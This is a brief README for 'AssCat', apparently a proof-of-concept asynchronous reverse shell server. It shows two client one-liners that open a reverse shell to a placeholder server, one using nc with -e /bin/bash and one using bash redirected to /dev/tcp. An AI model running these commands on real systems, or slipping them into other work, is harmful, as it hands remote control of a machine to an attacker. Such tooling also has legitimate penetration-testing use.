## AssCat
### Async (Reverse) Shell Server  

##### (only a PoC at the moment, project name might change)
<br>

###### Supports raw shell clients like:
```nc <SERVER_IP> <SERVER_PORT> -e /bin/bash```

###### or:
```bash -i >& /dev/tcp/<SERVER_IP>/<SERVER_PORT> 0>&1```

###### etc...